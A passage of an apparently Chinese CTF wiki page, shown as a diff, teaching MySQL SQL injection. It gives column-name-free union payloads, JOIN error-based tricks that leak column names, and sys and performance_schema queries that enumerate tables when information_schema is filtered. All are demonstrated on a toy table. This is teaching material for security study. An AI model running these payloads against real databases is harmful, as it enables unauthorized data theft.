+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">2</span> <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">3</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+</span>
+<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div></p>
+<p>这一句话的意思是将select 1,2,3 union select * from newtable的内容取名为**表a**，然后再按照列名进行选择 (select `1` from a)
+这里还有一个点是为什么要用 <strong>`1`</strong> 而不是 <strong>1</strong>。因为此时的表a的列名为数字1，2，3，所以需要用**反引号**对其进行转义</p>
+<p>那么当有了前面的基础后，我们就可以进行无列名的注入了</p>
+<p>假设现在有一个vulnerable sql
+<div class="highlight"><pre><span></span><code><span class="k">select</span> <span class="n">id</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">pwd</span> <span class="k">from</span> <span class="n">newtable</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">&#39;{$id}&#39;</span><span class="p">;</span> 
+</code></pre></div>
+而我们需要通过无列名的payload进行sql的注入，拿到内容</p>
+<p>可以使用下面这样的sql语句
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">id</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">pwd</span> <span class="k">from</span> <span class="n">newtable</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">&#39;111&#39;</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,(</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="o">`</span><span class="mi">2</span><span class="o">`</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">)</span><span class="k">c</span><span class="p">),</span><span class="mi">3</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">------+-----------------+------+</span>
+<span class="o">|</span> <span class="n">id</span>   <span class="o">|</span> <span class="n">name</span>            <span class="o">|</span> <span class="n">pwd</span>  <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+-----------------+------+</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span><span class="p">,</span><span class="n">zww</span><span class="p">,</span><span class="n">zww2</span><span class="p">,</span><span class="n">zww3</span> <span class="o">|</span> <span class="mi">3</span>    <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+-----------------+------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div>
+payload:
+<div class="highlight"><pre><span></span><code><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="o">`</span><span class="mi">2</span><span class="o">`</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">)</span><span class="k">c</span><span class="p">)</span>
+
+<span class="c1">-- 无逗号版本:</span>
+<span class="k">union</span> <span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">)</span><span class="n">m</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span> <span class="o">`</span><span class="n">b</span><span class="o">`</span><span class="p">)</span><span class="n">n</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span> <span class="o">`</span><span class="k">c</span><span class="o">`</span><span class="p">)</span><span class="n">t</span> <span class="k">where</span> <span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">)</span><span class="n">x</span>
+</code></pre></div></p>
+<p>总体来说，使用的还是union注入的思路，只是这里将其中的一个列换成我们要填入的payload即可</p>
+<p>注意这里需要用group_concat将`2`包裹，因为这一个无列名的payload会返回多行数据，而我们这里只能返回一个数据，所以可以使用group_concat将多行数据都连接起来，那么最后返回的也就是被我命名为2的列的数据了</p>
+<h4 id="join">JOIN报错注入</h4>
+<p>在某些开发者配置不当的场景下，服务器会返回sql查询的错误信息
+这时我们就可以使用JOIN进行报错注入</p>
+<p>表2的数据
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable2</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">------+-------+----------+</span>
+<span class="o">|</span> <span class="n">id2</span>  <span class="o">|</span> <span class="n">name2</span> <span class="o">|</span> <span class="n">pwd2</span>     <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+-------+----------+</span>
+<span class="o">|</span>    <span class="mi">4</span> <span class="o">|</span> <span class="n">zww</span>   <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">5</span> <span class="o">|</span> <span class="n">zww2</span>  <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">6</span> <span class="o">|</span> <span class="n">zww3</span>  <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+-------+----------+</span>
+<span class="mi">3</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div></p>
+<p>join的基本语法
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span> <span class="n">a</span> <span class="k">join</span> <span class="n">newtable2</span> <span class="n">b</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">------+------+----------+------+-------+----------+</span>
+<span class="o">|</span> <span class="n">id</span>   <span class="o">|</span> <span class="n">name</span> <span class="o">|</span> <span class="n">pwd</span>      <span class="o">|</span> <span class="n">id2</span>  <span class="o">|</span> <span class="n">name2</span> <span class="o">|</span> <span class="n">pwd2</span>     <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+------+----------+------+-------+----------+</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="n">zww</span>  <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>    <span class="mi">4</span> <span class="o">|</span> <span class="n">zww</span>   <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">2</span> <span class="o">|</span> <span class="n">zww2</span> <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>    <span class="mi">4</span> <span class="o">|</span> <span class="n">zww</span>   <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">3</span> <span class="o">|</span> <span class="n">zww3</span> <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>    <span class="mi">4</span> <span class="o">|</span> <span class="n">zww</span>   <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="n">zww</span>  <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>    <span class="mi">5</span> <span class="o">|</span> <span class="n">zww2</span>  <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">2</span> <span class="o">|</span> <span class="n">zww2</span> <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>    <span class="mi">5</span> <span class="o">|</span> <span class="n">zww2</span>  <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">3</span> <span class="o">|</span> <span class="n">zww3</span> <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>    <span class="mi">5</span> <span class="o">|</span> <span class="n">zww2</span>  <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">1</span> <span class="o">|</span> <span class="n">zww</span>  <span class="o">|</span> <span class="mi">123456</span>   <span class="o">|</span>    <span class="mi">6</span> <span class="o">|</span> <span class="n">zww3</span>  <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">2</span> <span class="o">|</span> <span class="n">zww2</span> <span class="o">|</span> <span class="mi">1234567</span>  <span class="o">|</span>    <span class="mi">6</span> <span class="o">|</span> <span class="n">zww3</span>  <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>
+<span class="o">|</span>    <span class="mi">3</span> <span class="o">|</span> <span class="n">zww3</span> <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>    <span class="mi">6</span> <span class="o">|</span> <span class="n">zww3</span>  <span class="o">|</span> <span class="mi">12345678</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------+------+----------+------+-------+----------+</span>
+<span class="mi">9</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div>
+要理解各种JOIN首先要理解笛卡尔积。笛卡尔积就是将A表的每一条记录与B表的每一条记录强行拼在一起。所以，如果A表有n条记录，B表有m条记录，笛卡尔积产生的结果就会产生n*m条记录。在这里就是3*3=9条记录</p>
+<p>留意一下，上面使用join之后返回的数据中的列名分别由newtable的列名和newtable2的列名组成
+那么，如果join之间的表格是同一个表格会怎么样呢？可想而知，列名会重复，这样就会造成sql查询报错，而这个报错类型会直接返回列名，这样我们就可以从报错信息中直接获取到表的列明了</p>
+<p>payload:
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span> <span class="n">a</span> <span class="k">join</span> <span class="n">newtable</span> <span class="n">b</span><span class="p">)</span><span class="k">c</span><span class="p">;</span>                         
+<span class="n">ERROR</span> <span class="mi">1060</span> <span class="p">(</span><span class="mi">42</span><span class="n">S21</span><span class="p">):</span> <span class="n">Duplicate</span> <span class="k">column</span> <span class="n">name</span> <span class="s1">&#39;id&#39;</span>
+<span class="c1">-- 这里如果使用 select * from newtable a join newtable b 是不会报错的，原因应该是执行这个语句时并没有去遍历列名</span>
+</code></pre></div></p>
+<p>这里报错信息直接给了第一列的列名
+后序的列名只需要用“using(前一个列名)”即可</p>
+<p>第二列
+<div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span> <span class="n">a</span> <span class="k">join</span> <span class="n">newtable</span> <span class="n">b</span> <span class="k">using</span><span class="p">(</span><span class="n">id</span><span class="p">))</span><span class="k">c</span><span class="p">;</span>
+<span class="n">ERROR</span> <span class="mi">1060</span> <span class="p">(</span><span class="mi">42</span><span class="n">S21</span><span class="p">):</span> <span class="n">Duplicate</span> <span class="k">column</span> <span class="n">name</span> <span class="s1">&#39;name&#39;</span>
+</code></pre></div></p>
+<h2 id="_2">获取表名</h2>
+<p>在有些情况下，因为过滤了or字段而导致information_schema这个库不能使用，这种情况下，我们如何查表名呢？</p>
+<p>下面的payload参考了<a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">MustaphaMond</a>师傅</p>
+<h3 id="innodb">Innodb</h3>
+<p>MySQL 5.6 及以上版本存在innodb_index_stats，innodb_table_stats两张表，其中包含新建立的库和表</p>
+<div class="highlight"><pre><span></span><code><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span> <span class="k">where</span> <span class="n">database_name</span> <span class="o">=</span> <span class="k">database</span><span class="p">();</span>
+<span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_index_stats</span> <span class="k">where</span> <span class="n">database_name</span> <span class="o">=</span> <span class="k">database</span><span class="p">();</span>
+</code></pre></div>
+
+<h3 id="sys">Sys</h3>
+<p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p>
+<div class="highlight"><pre><span></span><code><span class="o">//</span> <span class="err">含有自增的字段的表</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">schema_auto_increment_columns</span><span class="o">`</span> <span class="k">where</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+
+<span class="o">//</span> <span class="err">包含</span><span class="k">in</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$innodb_buffer_stats_by_table</span><span class="o">`</span> <span class="k">where</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">database</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">innodb_buffer_stats_by_table</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$schema_index_statistics</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+
+<span class="o">//</span> <span class="err">不包含</span><span class="k">in</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$schema_flattened_keys</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$ps_schema_table_statistics_io</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$schema_table_statistics_with_buffer</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+
+<span class="o">//</span> <span class="err">不含</span><span class="n">x$</span>
+<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">schema_table_statistics_with_buffer</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+
+<span class="o">//</span> <span class="err">通过表文件的存储路径获取表名</span>
+<span class="k">SELECT</span> <span class="n">FILE</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">io_global_by_file_by_bytes</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">FILE</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">FILE</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">io_global_by_file_by_latency</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">FILE</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">FILE</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$io_global_by_file_by_bytes</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">FILE</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+</code></pre></div>
+
+<p>包含之前查询记录的表
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">QUERY</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">x$statement_analysis</span> <span class="k">WHERE</span> <span class="n">QUERY</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">QUERY</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">statement_analysis</span><span class="o">`</span> <span class="k">where</span> <span class="n">QUERY</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+</code></pre></div></p>
+<h3 id="performance_schema">Performance_schema</h3>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">objects_summary_global_by_type</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_handles</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_io_waits_summary_by_index_usage</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_io_waits_summary_by_table</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_lock_waits_summary_by_table</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
+</code></pre></div>
+
+<p>包含之前查询记录的表
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">digest_text</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">events_statements_summary_by_digest</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">digest_text</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+</code></pre></div></p>
+<p>包含表文件路径的表
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">file_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">file_instances</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">file_name</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
+</code></pre></div></p>
+<h2 id="_3">参考链接</h2>
+<ul>
+<li>
+<p><a href="https://www.cnblogs.com/GH-D/p/11962522.html">https://www.cnblogs.com/GH-D/p/11962522.html</a></p>
+</li>
+<li>
+<p><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></p>
+</li>
+</ul>
+                
+                  
+                
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../introduction/" title="Introduction" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                Introduction
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../../CTF-Pwn/introduction/" title="Introduction" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                Introduction
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2019 - 2020 HNUSEC
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org" target="_blank" rel="noopener">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/application.c33a9706.js"></script>
+      
+        
+        
+          
+          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../../assets/javascripts/lunr/lunr.ja.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.1",url:{base:"../../.."}})</script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
